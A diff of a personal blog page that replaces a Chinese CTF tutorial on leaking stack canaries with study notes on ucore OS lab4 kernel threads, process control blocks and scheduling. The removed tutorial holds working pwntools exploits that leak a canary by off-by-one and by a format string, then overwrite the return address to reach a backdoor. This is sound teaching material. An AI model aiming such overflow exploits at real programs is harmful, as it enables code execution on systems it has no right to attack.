@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Bypass-Canary系列-泄露Canary值 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" Bypass-Canary , 格式化字串 ">
-  <meta name="description" content="Bypass-Canary系列-泄露Canary值 | sixpar&#39;s blog">
+  <title>天问计划week13-day1 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 天问计划 ">
+  <meta name="description" content="天问计划week13-day1 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -836,9 +836,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Bypass-Canary系列-泄露Canary值" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-天问计划week13-day1" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Bypass-Canary系列-泄露Canary值</h1>
+        <h1 class="article-title">天问计划week13-day1</h1>
     
     <div class="article-meta">
         
@@ -856,21 +856,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">Bypass-Canary</a>
-            
-            <a class="color1">格式化字串</a>
+            <a class="color5">天问计划</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-05 11:35:07'>2020-07-04 18:32</time>
+            Created At : <time class="date" title='Updated At: 2020-08-10 22:57:08'>2020-08-10 14:59</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.7k</span>
+        <span>Count:7.1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -900,7 +898,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#思路一："><span class="toc-text">思路一：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#例题（-Bypass-Canary-babypie）："><span class="toc-text">*例题（&#x2F;Bypass-Canary&#x2F;babypie）：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路二："><span class="toc-text">思路二：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#例题（-Bypass-Canary-bin0）："><span class="toc-text">*例题（&#x2F;Bypass-Canary&#x2F;bin0）：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp：-1"><span class="toc-text">exp：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#学习："><span class="toc-text">学习：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-lab4："><span class="toc-text">4. lab4：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-练习1："><span class="toc-text">4.1 练习1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-练习2："><span class="toc-text">4.2 练习2：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-练习3："><span class="toc-text">4.3 练习3：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-lab5："><span class="toc-text">5. lab5：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-0-练习0："><span class="toc-text">5.0 练习0：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-练习1："><span class="toc-text">5.1 练习1：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -916,106 +914,457 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>这是本系列的第二篇文章，介绍了如何将Canary的值泄露出来，因为Canary保护机制会在函数返回的时候检查Canary的值有无变化，因此我们后续溢出的时候记得在对应位置上把具体Canary的值填回去，以不至于Canary的值被我们的垃圾数据填充掉而触发报警结束程序，这么做便可以绕过机制，正常溢出覆盖返回地址。</p>
-</blockquote>
-<h2 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h2><p>有些程序会把我们输入的数据赋给x变量，然后又再次把x变量的值打印出来。<br>最常见的是打印欢迎词。例如《第二届浙江省网安竞赛初赛-uninit》里面一样。</p>
-<p>我们利用读入x变量，正好溢出到canary的位置，然后输出printf的时候就可以把canary的值当做x变量的一部分进行输出，泄露Canary的值。</p>
-<p>大致exp如下：</p>
-<pre><code class="python">r.recvuntil(&quot;Hello radish!n&quot;)
-r.sendline(&quot;a&quot;*100)
-r.recvuntil(&quot;a&quot;*100)
-canary = u32(r.recv(4))-0x0a     #泄露出Canary的值
-log.info(&quot;canary:&quot;+hex(canary))
+        <h2 id="学习："><a href="#学习：" class="headerlink" title="学习："></a>学习：</h2><p>lab2和lab3实现了对内存的虚拟化。而lab4实现CPU的虚拟化，即让ucore实现分时共享CPU，实现多条控制流（<code>内核线程</code>）能够并发执行。内核线程只运行在内核态，所有内核线程直接使用共同的ucore内核内存空间。</p>
+<p>管理线程的数据结构也叫做 进程控制块（PCB）。我们首先要创建内核线程对应的进程控制块，还需把这些进程控制块通过链表（link_list）连在一起，便于随时进行插入，删除和查找操作等进程管理事务。这个链表就是进程控制块链表。然后在通过<code>调度器（scheduler）</code>来让不同的内核线程在不同的时间段占用CPU执行，实现对CPU的分时共享。</p>
+<p>进程控制块的数据结构如下：</p>
+<pre><code class="c">/* kern/process/proc.h  */
 
-payload =  &quot;a&quot;*100     #填充
-payload += p32(canary)    #把泄露的canary值填回去（rbp-0x8）
-payload += &quot;a&quot;*8      #随便填    
-payload += &quot;aaaa&quot;     #ebp位置
-payload += p32(shell_addr)    # 覆盖返回地址
-r.sendline(payload)</code></pre>
-<p>相关解释：<br>注意第三行我们是使用sendline()发送数据，sendline()会自动在数据最后加上 “\n”，即换行符\x0a，所以 “\x0a”作为多出来的一字节将会把Canary的低字节给覆盖掉。<br>记得我们在开篇介绍里讲过Canary，它的低字节总是以”\x00”结尾，由于是小端序，所以将\x00放在前面，目的就是为了截断打印。但是现在\x00被覆盖为了\x0a，所以将持续输出导致Canary的值也给输出来了。我们要做的就是接收它。接收的4字节数据的低字节还是”\x0a”，所以我们再减去”\x0a”便是”\x00”,现在这4字节就是Canary的值了。最后构造payload时找准位置将Canary填回去就可了。</p>
-<h3 id="例题（-Bypass-Canary-babypie）："><a href="#例题（-Bypass-Canary-babypie）：" class="headerlink" title="*例题（/Bypass-Canary/babypie）："></a>*例题（/Bypass-Canary/babypie）：</h3><p>buf栈的大小是0x30（40字节），再加上Canary，所以说虽然栈空间开了48字节，但是我们能写入的只有40字节，剩下的8字节是用来存Canary的。  存在off by one漏洞。</p>
-<p>看图应该能理解：<br><img src="https://i.loli.net/2020/07/04/DtZR6UfbLVlMK9O.jpg" alt="栈分布"></p>
-<p>直接贴上exp，我在exp里解释的很详细了，包括程序调试结果。</p>
-<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><pre><code class="python">#coding=utf-8
-from pwn import *
-io=process(&#39;./babypie&#39;)
-context.log_level=&#39;debug&#39;
-io.sendline(&#39;a&#39;*40)
-gdb.attach(io,&#39;&#39;)
-#输入 stack 查看栈数据
-#发现 0008| 0x7ffd3bbfd4b0 (&#39;a&#39; &lt;repeats 40 times&gt;, &quot;\n\224\342kLG\367\025&quot;)
-#0x7ffd3bbfd4b0这个地址应该就是我们的输入，写的很清楚，&#39;a&#39;有40次
+struct proc_struct {
+    enum proc_state state; // Process state 运行状态
+    int pid; // Process ID 进程ID
+    int runs; // the running times of Proces  运行时间
+    uintptr_t kstack; // Process kernel stack  内核栈的位置
+    volatile bool need_resched; // need to be rescheduled to release CPU?  是否需要调度？
+    struct proc_struct *parent; // the parent process  它的父进程
+    struct mm_struct *mm; // Process&#39;s memory management field 进程的虚拟内存
+    struct context context; // Switch here to run process  进程的上下文环境
+    struct trapframe *tf; // Trap frame for current interrupt  当前中断帧的指针
+    uintptr_t cr3; // the base addr of Page Directroy Table(PDT)  当前页表的地址
+    uint32_t flags; // Process flag  进程
+    char name[PROC_NAME_LEN + 1]; // Process name  进程名字
+    list_entry_t list_link; // Process link list  进程链表
+    list_entry_t hash_link; // Process hash list 哈希链表
+};
 
-# gdb-peda$ x/20xg 0x7ffd3bbfd4b0
-# 0x7ffd3bbfd4b0:    0x6161616161616161    0x6161616161616161
-# 0x7ffd3bbfd4c0:    0x6161616161616161    0x6161616161616161
-# 0x7ffd3bbfd4d0:    0x6161616161616161    0x15f7474c6be2940a
+/*进程状态*/
+enum proc_state {              
+    PROC_UNINIT = 0,           //未初始状态 
+    PROC_SLEEPING,             //睡眠（阻塞）状态 
+    PROC_RUNNABLE,             //运行与就绪态 
+    PROC_ZOMBIE,               //僵死状态
+};
 
-#于是填入40字节的a，多出来的 \x0a 把Canary的低字节给覆盖了！
-io.recvuntil(&quot;\x0a&quot;)
-io.recvuntil(&quot;\x0a&quot;)
-#至于这里为什么是有两个recvuntil(&quot;\x0a&quot;)
-#解释：调试一遍就知道了
-#返回的数据是：
-# [DEBUG] Received 0x4f bytes:
-#     00000000  49 6e 70 75  74 20 79 6f  75 72 20 4e  61 6d 65 3a  │Inpu│t yo│ur N│ame:│
-#     00000010  0a 48 65 6c  6c 6f 20 61  61 61 61 61  61 61 61 61  │·Hel│lo a│aaaa│aaaa│
-#     00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
-#     00000030  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 0a  │aaaa│aaaa│aaaa│aaa·│
-#     00000040  84 2e f4 09  9f 59 ea 30  b0 01 a7 ff  7f 3a 0a     │·.··│·Y·0│····│·:·│
-#     0000004f
-#可见全文有3个0a，我们需要的是第二个0a后面的7个字节数据，所以自然要写两遍recvuntil(&quot;\x0a&quot;)啦。
-
-canary=u64(io.recv(7).rjust(8,&#39;\x00&#39;))
-#rjust，意为将该不满8字节的地址从低字节开始填充00，填满8字节。
-print hex(canary)
-
-# gdb.attach(io,&#39;&#39;)
-payload2=&#39;a&#39;*40+p64(canary)+p64(0xdeadbeef)+p8(0x3e)
-#这里的p8很有灵性，只修改一个字节。
-io.send(payload2)
-io.interactive()</code></pre>
-<p>有一点我要拿出来讲。由于本题程序偏移0xa3e的位置是有后门函数的，所以我们在构造payload时将返回地址覆盖为后门函数。但是由于存在PIE保护机制，后门函数的完整实际内存地址我们又不知道。所以就只修改<code>低字节</code>.<br>我调试的时候看过了，算了，贴上调试过程解释起来更清楚一点：</p>
-<pre><code class="python">0x7fffa701afe0:    0x6161616161616161    0x6161616161616161
-0x7fffa701aff0:    0x6161616161616161    0x6161616161616161
-0x7fffa701b000:    0x6161616161616161    0xea599f09f42e840a  &lt;==Canary值
-0x7fffa701b010:    0x00007fffa701b030    0x000055e225e16a6a  &lt;==返回地址</code></pre>
-<p>可以看到40字节的垃圾数据。多出来的”0a”把Canary低字节给覆盖了。所以Canary真正的值应为0xea599f09f42e8400。接下来8字节是rbp，再接下去8字节（0x7fffa701b018的位置）就是我们的返回地址了。我们发现低2字节为 6a6a （这么写虽然不规范，但是为了方便两者比较） 而我们的后门函数的偏移（低字节）为 a3e，怎么样，是不是就只需要修改最后1字节就好了呢。</p>
-<p>神奇吧。我一开始做到这题的时候就惊呼：涨知识了。使用p8()只修改1字节即可令返回地址整个地址变成后门函数的地址。因此可以忽略PIE带给我们的限制。</p>
-<p>看来本题的关键字是 低字节 没错了。</p>
-<hr>
-<h2 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h2><p>由于Linux对格式化字符的限制很少，导致格式化字符可以大肆利用，有时也是可以作为一种思路进行利用。</p>
-<p>而这里我们利用格式化漏洞，算好偏移地址，泄露出canary的地址。</p>
-<h3 id="例题（-Bypass-Canary-bin0）："><a href="#例题（-Bypass-Canary-bin0）：" class="headerlink" title="*例题（/Bypass-Canary/bin0）："></a>*例题（/Bypass-Canary/bin0）：</h3><p>main函数存在格式化字符串漏洞，漏洞代码如下：</p>
+/*进程上下文  寄存器*/
+struct context {                
+    uint32_t eip;               
+    uint32_t esp;
+    uint32_t ebx;
+    uint32_t ecx;
+    uint32_t edx;
+    uint32_t esi;
+    uint32_t edi;
+    uint32_t ebp;
+};</code></pre>
+<p>mm：内存管理的信息，包括内存映射列表、页表指针等。mm成员变量在lab3中用于虚存管理。但在实际OS中，内核线程常驻内存，不需要考虑swap page换页问题，在lab5中涉及到了用户进程，才考虑进程用户内存空间的swap page问题，mm才会发挥作用。所以在lab4中mm对于内核线程就没有用了，这样内核线程的proc_struct的成员变量mm=0是合理的。mm里有个很重要的项pgdir，记录的是该进程使用的一级页表的物理地址。由于mm=NULL，所以在proc_struct数据结构中需要有一个代替pgdir项来记录页表起始地址，所以就要用到了proc_struct数据结构中的cr3成员变量。</p>
+<p>state：进程所处的状态，有三种。运行，就绪，等待。</p>
+<p>parent：用户进程的父进程（创建它的进程）。在所有进程中，用来创建内核的第一个内核线程idleproc是没有父进程的。内核根据这个父子关系建立一个树形结构，用于维护一些特殊的操作，例如确定某个进程是否可以对另外一个进程进行某种操作等等。</p>
+<p>context：进程的上下文，用于进程切换（参见switch.S）。在 ucore中，所有的进程在内核中也是相对独立的（例如独立的内核堆栈以及上下文等等）。使用 context 保存寄存器的目的就在于在内核态中能够进行上下文之间的切换。实际利用context进行上下文切换的函数是在 kern/process/switch.S 中定义switch_to。</p>
+<p>tf：中断帧的指针，总是指向内核栈的某个位置：当进程从用户空间跳到内核空间时，中断帧记录了进程在被中断前的状态。当内核需要跳回用户空间时，需要调整中断帧以恢复让进程继续执行的各寄存器值。除此之外，uCore内核允许嵌套中断。因此为了保证嵌套中断发生时tf 总是能够指向当前的trapframe，ucore 在内核栈上维护了 tf 的链，可以参考trap.c::trap函数做进一步的了解。</p>
+<p>cr3：cr3 保存页表的物理地址，目的就是进程切换的时候方便直接使用 lcr3实现页表切换，避免每次都根据 mm 来计算 cr3。mm数据结构是用来实现用户空间的虚存管理的，但是内核线程没有用户空间，它执行的只是内核中的一小段代码（通常是一小段函数），所以它没有mm 结构，也就是NULL。当某个进程是一个普通用户态进程的时候，PCB 中的 cr3 就是 mm 中页表（pgdir）的物理地址；而当它是内核线程的时候，cr3 等于boot_cr3。而boot_cr3指向了uCore启动时建立好的内核虚拟空间的页目录表首地址。</p>
+<p>kstack：每个线程都有一个内核栈，并且位于内核地址空间的不同位置。对于内核线程，该栈就是运行时的程序使用的栈；而对于普通进程，该栈是发生特权级改变的时候使保存被打断的硬件信息用的栈。uCore在创建进程时分配了 2 个连续的物理页（参见memlayout.h中KSTACKSIZE的定义）作为内核栈的空间。这个栈很小，所以内核中的代码应该尽可能的紧凑，并且避免在栈上分配大的数据结构，以免栈溢出，导致系统崩溃。kstack记录了分配给该进程/线程的内核栈的位置。主要作用有以下几点。首先，当内核准备从一个进程切换到另一个的时候，需要根据kstack 的值正确的设置好 tss （可以回顾一下在实验一中讲述的 tss 在中断处理过程中的作用），以便在进程切换以后再发生中断时能够使用正确的栈。其次，内核栈位于内核地址空间，并且是不共享的（每个线程都拥有自己的内核栈），因此不受到 mm 的管理，当进程退出的时候，内核能够根据 kstack 的值快速定位栈的位置并进行回收。uCore 的这种内核栈的设计借鉴的是 linux 的方法（但由于内存管理实现的差异，它实现的远不如 linux 的灵活），它使得每个线程的内核栈在不同的位置，这样从某种程度上方便调试，但同时也使得内核对栈溢出变得十分不敏感，因为一旦发生溢出，它极可能污染内核中其它的数据使得内核崩溃。如果能够通过页表，将所有进程的内核栈映射到固定的地址上去，能够避免这种问题，但又会使得进程切换过程中对栈的修改变得相当繁琐。感兴趣的同学可以参考 linux kernel 的代码对此进行尝试。</p>
+<p>为了管理系统中所有的进程控制块，uCore维护了如下全局变量（位于<em>kern/process/proc.c</em>）：</p>
 <blockquote>
-<p> __isoc99_scanf(“%6s”, &amp;format);<br> printf(&amp;format);</p>
+<p>● static struct proc *current：当前占用CPU且处于“运行”状态进程控制块指针。通常这个变量是只读的，只有在进程切换的时候才进行修改，并且整个切换和修改过程需要保证操作的原子性，目前至少需要屏蔽中断。可以参考 switch_to 的实现。</p>
+<p>● static struct proc *initproc：本实验中，指向一个内核线程。本实验以后，此指针将指向第一个用户态进程。</p>
+<p>● static list_entry_t hash_list[HASH_LIST_SIZE]：所有进程控制块的哈希表，proc_struct中的成员变量hash_link将基于pid链接入这个哈希表中。</p>
+<p>● list_entry_t proc_list：所有进程控制块的双向线性列表，proc_struct中的成员变量list_link将链接入这个链表中。</p>
 </blockquote>
-<p>另外在 fun()函数中发现了栈溢出：</p>
+<p>创建并执行内核线程：</p>
+<p>建立进程控制块（proc.c中的alloc_proc函数）后，现在就可以通过进程控制块来创建具体的进程/线程了。首先，考虑最简单的内核线程，它通常只是内核中的一小段代码或者函数，没有自己的“专属”空间。这是由于在uCore OS启动后，已经对整个内核内存空间进行了管理，通过设置页表建立了内核虚拟空间（即boot_cr3指向的二级页表描述的空间）。所以uCore OS内核中的所有线程都不需要再建立各自的页表，只需共享这个内核虚拟空间就可以访问整个物理内存了。从这个角度看，内核线程被uCore OS内核这个大“内核进程”所管理。</p>
+<h2 id="4-lab4："><a href="#4-lab4：" class="headerlink" title="4. lab4："></a>4. lab4：</h2><p>实验流程：</p>
+<p>从lab4 的/kern/init/init.c中的kern_init函数开始，在kern_init函数中完成虚拟内存的初始化工作后，调用了proc_init函数，这个函数完成了idleproc内核线程和initproc内核线程的创建或复制工作，这也是本次实验要完成的练习。</p>
+<p>idleproc内核线程的工作就是不停地查询，看是否有其他内核线程可以执行了，如果有，马上让调度器选择那个内核线程执行（请参考cpu_idle函数的实现）。所以idleproc内核线程是在ucore操作系统没有其他内核线程可执行的情况下才会被调用。接着就是调用kernel_thread函数来创建initproc内核线程。而initproc内核线程的工作就是显示“Hello World”，表明自己存在且能正常工作了。</p>
+<p>调度器会在特定的调度点上执行调度，完成进程切换。在lab4中，这个调度点就一处，即在cpu_idle函数中，此函数如果发现当前进程（也就是idleproc）的need_resched置为1（在初始化idleproc的进程控制块时就置为1了），则调用schedule函数进行进程调度和进程切换。进程调度的过程其实比较简单，就是在进程控制块链表中查找到一个“合适”的内核线程，所谓“合适”就是指该内核线程处于“PROC_RUNNABLE”状态。在接下来的switch_to函数完成具体的进程切换过程。一旦切换成功，那么initproc内核线程就可以通过显示字符串来表明切换成功。</p>
+<h3 id="4-1-练习1："><a href="#4-1-练习1：" class="headerlink" title="4.1 练习1："></a>4.1 练习1：</h3><p>首先alloc_proc函数（位于kern/process/proc.c中）负责分配并返回一个新的struct proc_struct结构（第0个进程控制块，即 <code>idleproc</code>），用于存储新建立的内核线程的管理信息。ucore需要对这个结构进行最基本的初始化，你需要完成这个初始化过程，需要初始化的proc_struct结构中的成员变量至少包括：state/pid/runs/kstack/need_resched/parent/mm/context/tf/cr3/flags/name。</p>
+<pre><code class="c">// alloc_proc - alloc a proc_struct and init all fields of proc_struct
+    //LAB4:EXERCISE1 YOUR CODE
+    /*
+     * below fields in proc_struct need to be initialized
+     * enum proc_state state;         // Process state
+     * int pid;                       // Process ID
+     * int runs;                      // the running times of Proces
+     * uintptr_t kstack;              // Process kernel stack
+     * volatile bool need_resched;    // bool value: need to be rescheduled to release CPU?
+     * struct proc_struct *parent;    // the parent process
+     * struct mm_struct *mm;          // Process&#39;s memory management field
+     * struct context context;        // Switch here to run process
+     * struct trapframe *tf;         // Trap frame for current interrupt
+     * uintptr_t cr3;                   // CR3 register: the base addr of Page Directroy Table(PDT)
+     * uint32_t flags;               // Process flag
+     * char name[PROC_NAME_LEN + 1];   // Process name
+     */
+
+static struct proc_struct *
+alloc_proc(void) {
+    struct proc_struct *proc = kmalloc(sizeof(struct proc_struct)); // malloc 
+    if (proc != NULL) {  //init
+        proc-&gt;state = PROC_UNINIT;
+        proc-&gt;pid = -1;
+        proc-&gt;runs = 0;
+        proc-&gt;kstack = 0;
+        proc-&gt;need_resched = 0;
+        proc-&gt;parent = NULL;
+        proc-&gt;mm = NULL;  // mm is useless in lab4
+        memset(&amp;(proc-&gt;context), 0, sizeof(struct context));  //init context
+        proc-&gt;tf = NULL;
+        proc-&gt;cr3 = boot_cr3; //内核页表的起始地址boot_cr3
+        proc-&gt;flags = 0;
+        memset(proc-&gt;name, 0, PROC_NAME_LEN);
+    }
+    return proc;
+}
+
+/*
+总结一下过程：
+1 在堆上分配一块内存空间用来存放进程控制块
+2 初始化进程控制块内的各个参数
+3 返回分配的进程控制块
+*/</code></pre>
+<h3 id="4-2-练习2："><a href="#4-2-练习2：" class="headerlink" title="4.2 练习2："></a>4.2 练习2：</h3><p>为新创建的内核线程分配资源。</p>
+<p>创建一个内核线程需要分配和设置好很多资源。kernel_thread函数通过调用<strong>do_fork</strong>函数完成具体内核线程的创建工作。do_kernel函数首先会调用alloc_proc函数来分配并初始化一个进程控制块，但alloc_proc只是找到了一小块内存用以记录进程的必要信息，并没有实际分配这些资源。所以ucore一般都是通过do_fork实际创建新的内核线程。do_fork的作用是创建当前内核线程的一个副本，它们的执行上下文、代码、数据都一样，但是存储位置不同。在这个过程中，需要给新内核线程分配资源，并且复制原进程的状态。你需要完成在kern/process/proc.c中的do_fork函数中的处理过程。它的大致执行步骤包括：</p>
 <blockquote>
-<p>char buf; // [esp+8h] [ebp-70h]<br>…..<br>read(0, &amp;buf, 0x78u);</p>
+<ul>
+<li>调用alloc_proc，首先获得一块用户信息块。</li>
+<li>为进程分配一个内核栈。</li>
+<li>复制原进程的内存管理信息到新进程（但内核线程不必做此事）</li>
+<li>复制原进程上下文到新进程</li>
+<li>将新进程添加到进程列表</li>
+<li>唤醒新进程</li>
+<li>返回新进程号</li>
+</ul>
 </blockquote>
-<p>重点分析main函数中Canary的有关代码：</p>
-<pre><code class="python">mov     eax, 0
-mov     edx, [ebp+var_C]
-xor     edx, large gs:14h
-jz      short loc_804878A</code></pre>
-<p>看来Canary的值被放入到了 Var_C 变量里。我们直接点击Var_C 跟着来到栈里查看分布。<br>如下：<br><img src="https://i.loli.net/2020/07/04/eMH4aKCPBWtLVzw.jpg" alt="计算偏移"></p>
-<p>format变量存放着我们的输入，而本题存在格式化字符串漏洞。所以我们就能先计算出format和Var_C之间的偏移为7，然后通过格式化字符 %7$x 偏移7泄露Canary的值。</p>
-<h4 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h4><pre><code class="python">#coding=utf-8
-from pwn import *
-p=process(&#39;./bin&#39;)
-leak=&#39;%7$x&#39;    #直接看栈，format到var_c的距离为7
-p.sendline(leak)
-canary_addr=int(p.recv(),16)
-getflag=0x0804863B  #后门函数
-payload=&#39;a&#39;*(0x70-0xc)+p32(canary_addr)+&#39;a&#39;*12+p32(getflag)
-p.sendline(payload)
-p.interactive()</code></pre>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>思路一是通过sendline()发送满栈数据， off by one，刚好溢出的1字节覆盖canary的低字节00为0a，令printf持续输出泄露canary的值。</p>
-<p>思路二是通过格式化字符串漏洞泄露，格式化字符串只要利用的好，就可以泄露任意地址，以及任意地址写入。</p>
-<p>总算是写完了，呼~  QAQ</p>
+<p>do_fork函数的实现：</p>
+<pre><code class="c">/* do_fork:
+parent process for a new child process
+@clone_flags:used to guide how to clone the child process
+@stack:the parent&#39;s user stack pointer. if stack==0, It means to fork a kernel thread.
+@tf: the trapframe info, which will be copied to child process&#39;s proc-&gt;tf
+ */
+
+//LAB4:EXERCISE2 YOUR CODE
+    /*
+     * Some Useful MACROs, Functions and DEFINEs, you can use them in below implementation.
+     * MACROs or Functions:
+     *   alloc_proc:   create a proc struct and init fields (lab4:exercise1)
+     *   setup_kstack: alloc pages with size KSTACKPAGE as process kernel stack
+     *   copy_mm:      process &quot;proc&quot; duplicate OR share process &quot;current&quot;&#39;s mm according clone_flags
+     *                 if clone_flags &amp; CLONE_VM, then &quot;share&quot; ; else &quot;duplicate&quot;
+     *   copy_thread:  setup the trapframe on the  process&#39;s kernel stack top and
+     *                 setup the kernel entry point and stack of process
+     *   hash_proc:    add proc into proc hash_list
+     *   get_pid:      alloc a unique pid for process
+     *   wakup_proc:   set proc-&gt;state = PROC_RUNNABLE
+     * VARIABLES:
+     *   proc_list:    the process set&#39;s list
+     *   nr_process:   the number of process set
+     */
+
+    // Programing hints:
+    //    1. call alloc_proc to allocate a proc_struct
+    //    2. call setup_kstack to allocate a kernel stack for child process
+    //    3. call copy_mm to dup OR share mm according clone_flag
+    //    4. call copy_thread to setup tf &amp; context in proc_struct
+    //    5. insert proc_struct into hash_list &amp;&amp; proc_list
+    //    6. call wakup_proc to make the new child process RUNNABLE
+    //    7. set ret vaule using child proc&#39;s pid
+
+int
+do_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf) {
+    int ret = -E_NO_FREE_PROC;  //尝试为进程分配内存
+    struct proc_struct *proc;  //定义新进程
+    if (nr_process &gt;= MAX_PROCESS) { //分配进程数大于4096时返回
+        goto fork_out;
+    }
+    ret = -E_NO_MEM; //因内存不足而分配失败
+    //1.call alloc_proc to allocate a proc_struct
+    if((proc=alloc_proc())==NULL){ //分配内存失败
+        goto fork_out;
+    }
+    proc-&gt;parent=current;  //设置父进程名字
+    //2. call setup_kstack to allocate a kernel stack for child process
+    if(setup_kstack(proc)!=0){ //分配内核栈
+        goto bad_fork_cleanup_proc;
+    }
+    //3. call copy_mm to dup OR share mm according clone_flag
+    if(copy_mm(clone_flags,proc)!=0){
+        goto bad_fork_cleanup_kstack;
+    }
+    //4. call copy_thread to setup tf &amp; context in proc_struct
+    copy_thread(proc,stack,tf);  //复制中断帧和上下文信息
+    //5. insert proc_struct into hash_list &amp;&amp; proc_list
+    bool intr_flag;
+    local_intr_save(intr_flag); //屏蔽中断，intr_flag置为1
+    {
+        proc-&gt;pid=get_pid(); //获取当前进程PID
+        hash_proc(proc);  //建立proc映射
+        list_add(&amp;proc_list,&amp;(proc-&gt;list_link));  //加入进程链表
+        nr_process ++; //进程数+1
+    }
+    local_intr_restore(intr_flag);  //恢复中断
+    //6. call wakup_proc to make the new child process RUNNABLE
+    wakeup_proc(proc);  //唤醒进程
+    //7. set ret vaule using child proc&#39;s pid
+    ret=proc-&gt;pid;  //返回当前进程的PID
+
+fork_out:  // normal condition
+    return ret;
+bad_fork_cleanup_kstack:
+    put_kstack(proc);
+bad_fork_cleanup_proc:
+    kfree(proc);
+    goto fork_out;
+}
+</code></pre>
+<p>问题：请说明ucore是否做到给每个新fork的线程一个唯一的id？我们查看 proc.c 里的 get_pid函数，发现在使用 fork 或 clone 系统调用时产生的进程均会由内核分配一个新的唯一的PID值。而且在分配PID时会设置一个保护锁，暂时不允许中断，这样在就唯一地分配了一个PID。</p>
+<h3 id="4-3-练习3："><a href="#4-3-练习3：" class="headerlink" title="4.3 练习3："></a>4.3 练习3：</h3><p>阅读代码，理解proc_run函数和它调用的函数是如何完成进程切换的。</p>
+<p>首先分析 schedule 调度函数：</p>
+<pre><code class="c">/* 
+宏定义:
+#define le2proc(le, member)         \
+    to_struct((le), struct proc_struct, member)
+*/
+void
+schedule(void) {
+    bool intr_flag; //定义中断变量
+    list_entry_t *le, *last; //当前list，下一list
+    struct proc_struct *next = NULL; //下一个被调度的进程
+    local_intr_save(intr_flag); //禁止中断
+    {
+        current-&gt;need_resched = 0; //设置当前进程为&quot;不需要调度&quot;
+      //last是否是idleproc进程(第一个创建的进程),如果是，则从表头开始搜索
+      //否则获取下一链表
+        last = (current == idleproc) ? &amp;proc_list : &amp;(current-&gt;list_link);
+        le = last; 
+        do { //一直循环，直到找到可以调度的进程
+            if ((le = list_next(le)) != &amp;proc_list) {
+                next = le2proc(le, list_link);//获取下一进程
+                if (next-&gt;state == PROC_RUNNABLE) {
+                    break; //找到一个可以调度的进程,退出循环
+                }
+            }
+        } while (le != last); //循环查找整个链表
+        if (next == NULL || next-&gt;state != PROC_RUNNABLE) {
+            next = idleproc; //未找到可以调度的进程
+        }
+        next-&gt;runs ++; //进程运行次数加一
+        if (next != current) {
+            proc_run(next); //运行新进程,调用proc_run函数
+        }
+    }
+    local_intr_restore(intr_flag); //允许中断
+}</code></pre>
+<p>调度时实现的是FIFO算法：调度开始时先屏蔽中断，然后在进程链表中找到第一个可以被调度的进程，然后运行新进程，重新允许中断。</p>
+<p>运行新进程时用到 proc_run函数。</p>
+<p>proc_run函数的源码：</p>
+<pre><code class="c">void
+proc_run(struct proc_struct *proc) {
+    if (proc != current) { 
+        bool intr_flag; //定义中断变量
+        struct proc_struct *prev = current, *next = proc;
+        local_intr_save(intr_flag); //屏蔽中断
+        {
+            current = proc; //修改当前进程为新进程
+            load_esp0(next-&gt;kstack + KSTACKSIZE); //修改esp
+            lcr3(next-&gt;cr3); //修改页表项
+            //上下文切换:
+            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));
+        }
+        local_intr_restore(intr_flag); //允许中断
+    }
+}</code></pre>
+<p>proc_run里调用到switch_to函数来切换上下文：</p>
+<pre><code class="python">switch_to:                      # switch_to(from, to)
+    # save from&#39;s registers  
+    #保护执行现场
+    movl 4(%esp), %eax          #保存from的首地址
+    popl 0(%eax)                #将返回值保存到context的eip
+    movl %esp, 4(%eax)          #保存esp的值到context的esp
+    movl %ebx, 8(%eax)          #保存ebx的值到context的ebx
+    movl %ecx, 12(%eax)         #保存ecx的值到context的ecx
+    movl %edx, 16(%eax)         #保存edx的值到context的edx
